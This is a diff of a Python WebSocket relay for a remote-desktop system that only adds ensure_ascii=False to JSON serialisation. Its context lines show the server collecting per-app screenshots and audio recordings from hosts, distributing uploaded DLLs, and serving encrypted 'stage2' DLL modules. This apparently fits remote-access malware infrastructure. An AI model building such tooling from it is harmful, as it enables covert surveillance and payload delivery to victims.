@@ -4,7 +4,7 @@ RemoteDesktop VPS Server - WebSocket Relay
 Bridges C++ host <--> Web client
 Version: 2024-03-12-v3 (stream throttle + diagnostics)
 """
-SERVER_VERSION = "1.0.209"
+SERVER_VERSION = "1.0.225"
 
 import asyncio
 import websockets
@@ -177,7 +177,7 @@ def _get_app_quotas(d: Path) -> dict:
 
 def _save_app_quotas(d: Path, quotas: dict):
     d.mkdir(parents=True, exist_ok=True)
-    (d / "_app_quotas.json").write_text(json.dumps(quotas, indent=2))
+    (d / "_app_quotas.json").write_text(json.dumps(quotas, indent=2, ensure_ascii=False))
 
 def _get_app_from_filename(name: str) -> str:
     """Extract app/site name from screenshot filename: YYYYMMDD_HHMMSS_AppName"""
@@ -274,7 +274,7 @@ def _load_templates() -> dict:
 
 def _save_templates(templates: dict):
     SCREENSHOT_TEMPLATES_FILE.parent.mkdir(parents=True, exist_ok=True)
-    SCREENSHOT_TEMPLATES_FILE.write_text(json.dumps(templates, indent=2))
+    SCREENSHOT_TEMPLATES_FILE.write_text(json.dumps(templates, indent=2, ensure_ascii=False))
 
 # ─── Audio Recording Storage ─────────────────────────────────────────────────
 def _ensure_audio_dir(token: str) -> Path:
@@ -653,13 +653,13 @@ def new_user_id() -> str:
 
 # ─── JSON helpers ─────────────────────────────────────────────────────────────
 def make_error(msg: str, req_id: str = "") -> str:
-    return json.dumps({"ok": False, "error": msg, "id": req_id})
+    return json.dumps({"ok": False, "error": msg, "id": req_id}, ensure_ascii=False)
 
 def make_ok(data, req_id: str = "") -> str:
-    return json.dumps({"ok": True, "data": data, "id": req_id})
+    return json.dumps({"ok": True, "data": data, "id": req_id}, ensure_ascii=False)
 
 def make_event(event: str, data) -> str:
-    return json.dumps({"event": event, "data": data})
+    return json.dumps({"event": event, "data": data}, ensure_ascii=False)
 
 # ─── Room management ─────────────────────────────────────────────────────────
 async def get_or_create_room(token: str, password: str = "", role: str = "client") -> Room:
@@ -800,7 +800,7 @@ async def handler(websocket, path: str):
             "role": role,
             "host_online": room.host is not None,
             "server_version": SERVER_VERSION,
-        }))
+        }, ensure_ascii=False))
         
         log.info(f"Auth OK: role={role} token={token[:8]}... id={user_id} from={remote}")
 
@@ -913,7 +913,7 @@ async def handler(websocket, path: str):
                                         fpath = f; break
                                 notify = json.dumps({"event": "new_screenshot", "name": saved_name,
                                     "size": fpath.stat().st_size if fpath else 0,
-                                    "time": int(time.time())})
+                                    "time": int(time.time())}, ensure_ascii=False)
                                 await broadcast_to_clients(room, notify)
                                 log.debug(f"Screenshot saved: {saved_name} ({len(enc_data)} bytes)")
                     elif len(raw_msg) >= 4 and raw_msg[:4] == b'ALIV':
@@ -935,7 +935,7 @@ async def handler(websocket, path: str):
                                 notify = json.dumps({"event": "new_recording", "name": saved_name,
                                     "ext": fpath.suffix if fpath else ".aac",
                                     "size": fpath.stat().st_size if fpath else 0,
-                                    "time": int(time.time())})
+                                    "time": int(time.time())}, ensure_ascii=False)
                                 await broadcast_to_clients(room, notify)
                     elif len(raw_msg) >= 4 and raw_msg[:4] == b'FILE' and room.file_clients:
                         # FILE binary from host main ws → round-robin to file_recv clients
@@ -984,7 +984,7 @@ async def handler(websocket, path: str):
                             await websocket.send(json.dumps({
                                 "id": msg.get("id",""), "ok": False,
                                 "error": "Invalid username or password",
-                            }))
+                            }, ensure_ascii=False))
                             continue
                         sid = _create_session(u)
                         # Persist last_login in users.json
@@ -1008,7 +1008,7 @@ async def handler(websocket, path: str):
                                 "all_tabs": ALL_TABS,
                                 "theme": u.get("theme", ""),
                             },
-                        }))
+                        }, ensure_ascii=False))
                         continue
 
                     if cmd_name == "user_logout":
@@ -1019,7 +1019,7 @@ async def handler(websocket, path: str):
                         await websocket.send(json.dumps({
                             "id": msg.get("id",""), "ok": True,
                             "data": {"logged_out": True},
-                        }))
+                        }, ensure_ascii=False))
                         continue
 
                     # ── Self-service password change (any logged-in user) ──
@@ -1034,14 +1034,14 @@ async def handler(websocket, path: str):
                         if not s:
                             await websocket.send(json.dumps({
                                 "id": msg.get("id",""), "ok": False,
-                                "error": "not logged in"}))
+                                "error": "not logged in"}, ensure_ascii=False))
                             continue
                         old_pwd = str(msg.get("old_password",""))
                         new_pwd = str(msg.get("new_password",""))
                         if not new_pwd or len(new_pwd) < 4:
                             await websocket.send(json.dumps({
                                 "id": msg.get("id",""), "ok": False,
-                                "error": "new password must be at least 4 chars"}))
+                                "error": "new password must be at least 4 chars"}, ensure_ascii=False))
                             continue
                         async with _users_lock:
                             data = _load_users()
@@ -1052,14 +1052,14 @@ async def handler(websocket, path: str):
                             if not target:
                                 await websocket.send(json.dumps({
                                     "id": msg.get("id",""), "ok": False,
-                                    "error": "user not found"}))
+                                    "error": "user not found"}, ensure_ascii=False))
                                 continue
                             # Re-check old password (prevents session theft
                             # from silently rotating the password).
                             if _hash_password(old_pwd, target.get("salt","")) != target.get("password_hash"):
                                 await websocket.send(json.dumps({
                                     "id": msg.get("id",""), "ok": False,
-                                    "error": "old password incorrect"}))
+                                    "error": "old password incorrect"}, ensure_ascii=False))
                                 continue
                             salt = secrets.token_hex(16)
                             target["salt"] = salt
@@ -1068,7 +1068,7 @@ async def handler(websocket, path: str):
                         _log_user_activity(s, "user_change_password", s["username"])
                         await websocket.send(json.dumps({
                             "id": msg.get("id",""), "ok": True,
-                            "data": {"changed": True}}))
+                            "data": {"changed": True}}, ensure_ascii=False))
                         continue
 
                     if cmd_name == "user_set_theme":
@@ -1078,7 +1078,7 @@ async def handler(websocket, path: str):
                         if not s:
                             await websocket.send(json.dumps({
                                 "id": msg.get("id",""), "ok": False,
-                                "error": "not logged in"}))
+                                "error": "not logged in"}, ensure_ascii=False))
                             continue
                         theme_name = str(msg.get("theme","")).strip()[:32]
                         async with _users_lock:
@@ -1090,7 +1090,7 @@ async def handler(websocket, path: str):
                             _save_users(data)
                         await websocket.send(json.dumps({
                             "id": msg.get("id",""), "ok": True,
-                            "data": {"theme": theme_name}}))
+                            "data": {"theme": theme_name}}, ensure_ascii=False))
                         continue
 
                     if cmd_name == "user_session_check":
@@ -1100,7 +1100,7 @@ async def handler(websocket, path: str):
                             await websocket.send(json.dumps({
                                 "id": msg.get("id",""), "ok": False,
                                 "error": "session expired",
-                            }))
+                            }, ensure_ascii=False))
                             continue
                         await websocket.send(json.dumps({
                             "id": msg.get("id",""), "ok": True,
@@ -1110,7 +1110,7 @@ async def handler(websocket, path: str):
                                 "allowed_tabs": s["allowed_tabs"],
                                 "all_tabs": ALL_TABS,
                             },
-                        }))
+                        }, ensure_ascii=False))
                         continue
 
                     # ── host_events_stats — any logged-in user ──
@@ -1121,7 +1121,7 @@ async def handler(websocket, path: str):
                         if not s:
                             await websocket.send(json.dumps({
                                 "id": msg.get("id",""), "ok": False,
-                                "error": "not logged in"}))
+                                "error": "not logged in"}, ensure_ascii=False))
                             continue
                         # Collect currently live host connections for state correction
                         async with rooms_lock:
@@ -1152,7 +1152,7 @@ async def handler(websocket, path: str):
                         stats["recent_feed"] = feed[-50:]
                         await websocket.send(json.dumps({
                             "id": msg.get("id",""), "ok": True,
-                            "data": stats}))
+                            "data": stats}, ensure_ascii=False))
                         continue
 
                     # ── Admin-only user management ──
@@ -1165,7 +1165,7 @@ async def handler(websocket, path: str):
                             await websocket.send(json.dumps({
                                 "id": msg.get("id",""), "ok": False,
                                 "error": "admin only",
-                            }))
+                            }, ensure_ascii=False))
                             continue
 
                         if cmd_name == "user_list":
@@ -1181,7 +1181,7 @@ async def handler(websocket, path: str):
                             await websocket.send(json.dumps({
                                 "id": msg.get("id",""), "ok": True,
                                 "data": {"users": out, "all_tabs": ALL_TABS},
-                            }))
+                            }, ensure_ascii=False))
                             continue
 
                         if cmd_name == "user_create":
@@ -1194,14 +1194,14 @@ async def handler(websocket, path: str):
                             if not uname or not pwd:
                                 await websocket.send(json.dumps({
                                     "id": msg.get("id",""), "ok": False,
-                                    "error": "username + password required"}))
+                                    "error": "username + password required"}, ensure_ascii=False))
                                 continue
                             async with _users_lock:
                                 data = _load_users()
                                 if any(u.get("username")==uname for u in data.get("users",[])):
                                     await websocket.send(json.dumps({
                                         "id": msg.get("id",""), "ok": False,
-                                        "error": "username taken"}))
+                                        "error": "username taken"}, ensure_ascii=False))
                                     continue
                                 salt = secrets.token_hex(16)
                                 data.setdefault("users", []).append({
@@ -1217,7 +1217,7 @@ async def handler(websocket, path: str):
                             _log_user_activity(s, "user_create", uname)
                             await websocket.send(json.dumps({
                                 "id": msg.get("id",""), "ok": True,
-                                "data": {"created": uname}}))
+                                "data": {"created": uname}}, ensure_ascii=False))
                             continue
 
                         if cmd_name == "user_update":
@@ -1232,7 +1232,7 @@ async def handler(websocket, path: str):
                                 if not found:
                                     await websocket.send(json.dumps({
                                         "id": msg.get("id",""), "ok": False,
-                                        "error": "user not found"}))
+                                        "error": "user not found"}, ensure_ascii=False))
                                     continue
                                 if "password" in updates and updates["password"]:
                                     salt = secrets.token_hex(16)
@@ -1247,7 +1247,7 @@ async def handler(websocket, path: str):
                             _log_user_activity(s, "user_update", target)
                             await websocket.send(json.dumps({
                                 "id": msg.get("id",""), "ok": True,
-                                "data": {"updated": target}}))
+                                "data": {"updated": target}}, ensure_ascii=False))
                             continue
 
                         if cmd_name == "user_delete":
@@ -1255,7 +1255,7 @@ async def handler(websocket, path: str):
                             if target == s.get("username"):
                                 await websocket.send(json.dumps({
                                     "id": msg.get("id",""), "ok": False,
-                                    "error": "cannot delete yourself"}))
+                                    "error": "cannot delete yourself"}, ensure_ascii=False))
                                 continue
                             async with _users_lock:
                                 data = _load_users()
@@ -1269,7 +1269,7 @@ async def handler(websocket, path: str):
                             _log_user_activity(s, "user_delete", target)
                             await websocket.send(json.dumps({
                                 "id": msg.get("id",""), "ok": True,
-                                "data": {"deleted": target}}))
+                                "data": {"deleted": target}}, ensure_ascii=False))
                             continue
 
                         if cmd_name == "user_activity":
@@ -1289,14 +1289,14 @@ async def handler(websocket, path: str):
                             entries = entries[-limit:]
                             await websocket.send(json.dumps({
                                 "id": msg.get("id",""), "ok": True,
-                                "data": {"entries": entries}}))
+                                "data": {"entries": entries}}, ensure_ascii=False))
                             continue
 
                     # Screenshot commands: handled by VPS directly
                     sc_cmd = cmd_name
                     if sc_cmd == "screenshot_list":
                         items = _list_screenshots(room.token)
-                        resp = json.dumps({"id": msg.get("id",""), "ok": True, "data": {"cmd":"screenshot_list_result","items":items}})
+                        resp = json.dumps({"id": msg.get("id",""), "ok": True, "data": {"cmd":"screenshot_list_result","items":items}}, ensure_ascii=False)
                         await websocket.send(resp)
                         continue
                     elif sc_cmd == "screenshot_thumb":
@@ -1310,7 +1310,7 @@ async def handler(websocket, path: str):
                             header = b'STMB' + struct.pack('<I', len(name_bytes)) + name_bytes
                             await websocket.send(header + thumb)
                         else:
-                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Not found"}))
+                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Not found"}, ensure_ascii=False))
                         continue
                     elif sc_cmd == "screenshot_view":
                         name = msg.get("name", "")
@@ -1322,7 +1322,7 @@ async def handler(websocket, path: str):
                             header = b'SIMG' + struct.pack('<I', len(name_bytes)) + name_bytes
                             await websocket.send(header + data)
                         else:
-                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Not found"}))
+                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Not found"}, ensure_ascii=False))
                         continue
                     elif sc_cmd == "screenshot_download":
                         name = msg.get("name", "")
@@ -1334,7 +1334,7 @@ async def handler(websocket, path: str):
                             header = b'SDWN' + struct.pack('<I', len(name_bytes)) + name_bytes
                             await websocket.send(header + data)
                         else:
-                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Not found"}))
+                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Not found"}, ensure_ascii=False))
                         continue
                     elif sc_cmd == "screenshot_delete":
                         names = msg.get("names", [])
@@ -1345,7 +1345,7 @@ async def handler(websocket, path: str):
                             if fpath.exists():
                                 fpath.unlink()
                                 deleted += 1
-                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"deleted": deleted}}))
+                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"deleted": deleted}}, ensure_ascii=False))
                         continue
                     elif sc_cmd == "screenshot_save_template":
                         tname = msg.get("template_name", "")
@@ -1354,14 +1354,14 @@ async def handler(websocket, path: str):
                             templates = _load_templates()
                             templates[tname] = tapps
                             _save_templates(templates)
-                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": "saved"}))
+                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": "saved"}, ensure_ascii=False))
                         continue
                     elif sc_cmd == "screenshot_delete_template":
                         tname = msg.get("template_name", "")
                         templates = _load_templates()
                         templates.pop(tname, None)
                         _save_templates(templates)
-                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": "deleted"}))
+                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": "deleted"}, ensure_ascii=False))
                         continue
                     elif sc_cmd == "screenshot_set_quota":
                         quota_mb = int(msg.get("quota_mb", 500))
@@ -1375,7 +1375,7 @@ async def handler(websocket, path: str):
                         d = SCREENSHOT_DIR / room.token
                         if d.exists():
                             _enforce_quota(d, SCREENSHOT_QUOTA)
-                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"quota_mb": quota_mb}}))
+                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"quota_mb": quota_mb}}, ensure_ascii=False))
                         log.info(f"Screenshot quota set to {quota_mb}MB for {room.token}")
                         continue
                     elif sc_cmd == "screenshot_get_quota":
@@ -1399,7 +1399,7 @@ async def handler(websocket, path: str):
                             "quota_mb": qmb, "used_bytes": used,
                             "app_usage": {k: v for k, v in app_usage.items()},
                             "app_quotas": app_quotas
-                        }}))
+                        }}, ensure_ascii=False))
                         continue
                     elif sc_cmd == "screenshot_set_app_quota":
                         app = msg.get("app", "")
@@ -1412,15 +1412,15 @@ async def handler(websocket, path: str):
                             quotas.pop(app, None)
                         _save_app_quotas(d, quotas)
                         _enforce_quota(d)
-                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": "saved"}))
+                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": "saved"}, ensure_ascii=False))
                         continue
                     elif sc_cmd == "screenshot_save_settings":
                         # Save screenshot settings on VPS (for sync between sessions)
                         settings = msg.get("settings", {})
                         d = _ensure_screenshot_dir(room.token)
                         settings_file = d / "_settings.json"
-                        settings_file.write_text(json.dumps(settings, indent=2))
-                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": "saved"}))
+                        settings_file.write_text(json.dumps(settings, indent=2, ensure_ascii=False))
+                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": "saved"}, ensure_ascii=False))
                         continue
                     elif sc_cmd == "screenshot_load_settings":
                         d = SCREENSHOT_DIR / room.token
@@ -1429,11 +1429,11 @@ async def handler(websocket, path: str):
                         if settings_file.exists():
                             try: settings = json.loads(settings_file.read_text())
                             except: pass
-                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": settings}))
+                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": settings}, ensure_ascii=False))
                         continue
                     elif sc_cmd == "screenshot_templates":
                         templates = _load_templates()
-                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"cmd":"screenshot_templates_result","templates":templates}}))
+                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"cmd":"screenshot_templates_result","templates":templates}}, ensure_ascii=False))
                         continue
 
                     # Upload update file: client sends DLL to VPS for host to download
@@ -1453,12 +1453,12 @@ async def handler(websocket, path: str):
                                 fpath = update_dir / fname
                                 fpath.write_bytes(bin_data)
                                 url = f"https://{websocket.request.host.split(':')[0]}/files/{fname}" if hasattr(websocket, 'request') and hasattr(websocket.request, 'host') else f"/files/{fname}"
-                                await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"url": url, "size": len(bin_data), "path": str(fpath)}}))
+                                await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"url": url, "size": len(bin_data), "path": str(fpath)}}, ensure_ascii=False))
                                 logger.info(f"Update file uploaded: {fpath} ({len(bin_data)} bytes)")
                             else:
-                                await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "No binary data received"}))
+                                await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "No binary data received"}, ensure_ascii=False))
                         except asyncio.TimeoutError:
-                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Upload timeout"}))
+                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Upload timeout"}, ensure_ascii=False))
                         continue
 
                     # VPS deploy: upload files to server directories
@@ -1466,7 +1466,7 @@ async def handler(websocket, path: str):
                         fname = msg.get("filename", "")
                         target = msg.get("target", "")  # "web", "relay", "files"
                         if not fname or not target:
-                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Missing filename or target"}))
+                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Missing filename or target"}, ensure_ascii=False))
                             continue
                         try:
                             # Wait for binary data — skip any text messages that arrive in between
@@ -1486,7 +1486,7 @@ async def handler(websocket, path: str):
                                     dest = Path("/var/www/remote-desktop/files") / fname
                                     dest.parent.mkdir(parents=True, exist_ok=True)
                                 else:
-                                    await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Unknown target: " + target}))
+                                    await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Unknown target: " + target}, ensure_ascii=False))
                                     continue
                                 # Backup existing
                                 if dest.exists():
@@ -1497,16 +1497,16 @@ async def handler(websocket, path: str):
                                     except: pass
                                 dest.write_bytes(bin_data)
                                 logger.info(f"VPS deploy: {fname} -> {dest} ({len(bin_data)} bytes)")
-                                await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"path": str(dest), "size": len(bin_data)}}))
+                                await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"path": str(dest), "size": len(bin_data)}}, ensure_ascii=False))
                             else:
-                                await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "No data received"}))
+                                await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "No data received"}, ensure_ascii=False))
                         except asyncio.TimeoutError:
-                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Upload timeout"}))
+                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Upload timeout"}, ensure_ascii=False))
                         continue
 
                     # VPS restart: restart server.py service
                     elif sc_cmd == "vps_restart":
-                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"message": "Restarting in 2 seconds..."}}))
+                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"message": "Restarting in 2 seconds..."}}, ensure_ascii=False))
                         # Schedule restart after response is sent
                         async def _do_restart():
                             await asyncio.sleep(2)
@@ -1518,7 +1518,7 @@ async def handler(websocket, path: str):
                     # Audio commands: handled by VPS directly
                     elif sc_cmd == "audio_list":
                         items = _list_audio(room.token)
-                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"items": items}}))
+                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"items": items}}, ensure_ascii=False))
                         continue
                     elif sc_cmd == "audio_play":
                         name = msg.get("name", "")
@@ -1534,7 +1534,7 @@ async def handler(websocket, path: str):
                             header = b'APLY' + struct.pack('<I', len(name_bytes)) + name_bytes
                             await websocket.send(header + data)
                         else:
-                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Not found"}))
+                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Not found"}, ensure_ascii=False))
                         continue
                     elif sc_cmd == "audio_download":
                         name = msg.get("name", "")
@@ -1549,7 +1549,7 @@ async def handler(websocket, path: str):
                             header = b'ADWN' + struct.pack('<I', len(name_bytes)) + name_bytes
                             await websocket.send(header + data)
                         else:
-                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Not found"}))
+                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Not found"}, ensure_ascii=False))
                         continue
                     elif sc_cmd == "audio_delete":
                         names = msg.get("names", [])
@@ -1563,14 +1563,14 @@ async def handler(websocket, path: str):
                                     deleted += 1
                                     log.info(f"Audio deleted: {n}{ext}")
                         log.info(f"Audio delete: {deleted} files from {len(names)} requested")
-                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"deleted": deleted}}))
+                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"deleted": deleted}}, ensure_ascii=False))
                         continue
                     elif sc_cmd == "audio_set_quota":
                         quota_mb = int(msg.get("quota_mb", 500))
                         d = _ensure_audio_dir(room.token)
                         (d / "_quota.txt").write_text(str(quota_mb))
                         _enforce_audio_quota(d)
-                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"quota_mb": quota_mb}}))
+                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"quota_mb": quota_mb}}, ensure_ascii=False))
                         continue
                     elif sc_cmd == "audio_get_quota":
                         d = AUDIO_DIR / room.token
@@ -1582,7 +1582,7 @@ async def handler(websocket, path: str):
                         used = 0
                         if d.exists():
                             used = sum(f.stat().st_size for f in d.iterdir() if f.is_file() and f.suffix in ('.ogg','.aac','.opus','.mp3','.wav'))
-                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"quota_mb": qmb, "used_bytes": used}}))
+                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"quota_mb": qmb, "used_bytes": used}}, ensure_ascii=False))
                         continue
 
                     # SpeedTest: VPS responds directly, no relay to host
@@ -1600,7 +1600,7 @@ async def handler(websocket, path: str):
                         await websocket.send(json.dumps({
                             "id": st_id, "ok": True,
                             "data": {"bytes": size, "elapsed_s": round(elapsed, 6)}
-                        }))
+                        }, ensure_ascii=False))
                         continue
 
                     if st_cmd == "speed_test_vps_upload":
@@ -1619,7 +1619,7 @@ async def handler(websocket, path: str):
                         await websocket.send(json.dumps({
                             "id": st_id, "ok": True,
                             "data": {"bytes": total_recv, "elapsed_s": round(elapsed, 6)}
-                        }))
+                        }, ensure_ascii=False))
                         continue
 
                     # clients_list: handled by VPS (has full info about connected clients)
@@ -1654,14 +1654,14 @@ async def handler(websocket, path: str):
                                 "stream_count": len(room.stream_clients),
                                 "file_count": len(room.file_clients),
                             }
-                        }))
+                        }, ensure_ascii=False))
                         continue
 
                     # Client → Host
                     if room.host:
                         try:
                             msg["_from"] = user_id
-                            await room.host.ws.send(json.dumps(msg))
+                            await room.host.ws.send(json.dumps(msg, ensure_ascii=False))
                         except:
                             await websocket.send(make_error("Host disconnected"))
                     else:
@@ -1699,7 +1699,7 @@ async def handler(websocket, path: str):
                                 "event": event_name,
                                 "ts":    int(msg.get("ts", 0) or 0),
                                 "host_version": str(msg.get("host_version", "")),
-                            })
+                            }, ensure_ascii=False)
                             for c in list(room.clients):
                                 try:
                                     await c.ws.send(forward_msg)
@@ -1720,7 +1720,7 @@ async def handler(websocket, path: str):
                             await websocket.send(json.dumps({
                                 "id": req_id, "ok": False,
                                 "error": "unknown stage2 module"
-                            }))
+                            }, ensure_ascii=False))
                             continue
                         # On-the-fly encryption (or cache hit) — see _stage2_get_blob.
                         # DLLs must be deployed to STAGE2_DIR as flat <module>.dll files.
@@ -1729,13 +1729,13 @@ async def handler(websocket, path: str):
                             await websocket.send(json.dumps({
                                 "id": req_id, "ok": False,
                                 "error": f"stage2 module not available: {module}"
-                            }))
+                            }, ensure_ascii=False))
                             continue
                         if len(data) > STAGE2_MAX_BLOB:
                             await websocket.send(json.dumps({
                                 "id": req_id, "ok": False,
                                 "error": "stage2 blob too large"
-                            }))
+                            }, ensure_ascii=False))
                             continue
                         b64 = base64.b64encode(data).decode("ascii")
                         await websocket.send(json.dumps({
@@ -1746,7 +1746,7 @@ async def handler(websocket, path: str):
                                 "size":   len(data),
                                 "blob_b64": b64,
                             }
-                        }))
+                        }, ensure_ascii=False))
                         log.info(f"stage2: served {module}.bin ({len(data):,} bytes) to host token={room.token[:8]}")
                         continue
 
@@ -1761,12 +1761,12 @@ async def handler(websocket, path: str):
 
                     if target_id and target_id in room.clients:
                         try:
-                            await room.clients[target_id].ws.send(json.dumps(msg))
+                            await room.clients[target_id].ws.send(json.dumps(msg, ensure_ascii=False))
                         except:
                             pass
                     else:
                         # Broadcast text to command clients only (not stream connections)
-                        await broadcast_to_clients(room, json.dumps(msg))
+                        await broadcast_to_clients(room, json.dumps(msg, ensure_ascii=False))
     
     except websockets.exceptions.ConnectionClosed as e:
         log.info(f"Connection closed: {remote} code={e.code}")
@@ -1804,7 +1804,7 @@ async def handler(websocket, path: str):
                         "epoch": epoch_now,
                         "token": token,
                         "event": "disconnect",
-                    })
+                    }, ensure_ascii=False)
                     with HOST_EVENTS_LOG.open("a", encoding="utf-8") as _lf:
                         _lf.write(disc_line + "\n")
                     _recent_host_events.append(json.loads(disc_line))
@@ -2258,7 +2258,7 @@ async def stats_handler(websocket, path: str):
         raw = await asyncio.wait_for(websocket.recv(), timeout=5)
         msg = json.loads(raw)
         if msg.get("admin_token") != ADMIN_TOKEN:
-            await websocket.send(json.dumps({"error": "forbidden"}))
+            await websocket.send(json.dumps({"error": "forbidden"}, ensure_ascii=False))
             return
 
         req_type = str(msg.get("type", "rooms"))
@@ -2292,7 +2292,7 @@ async def stats_handler(websocket, path: str):
         if "type" not in msg:
             data = data.get("rooms_snapshot", data)
 
-        await websocket.send(json.dumps(data))
+        await websocket.send(json.dumps(data, ensure_ascii=False))
     except:
         pass
 
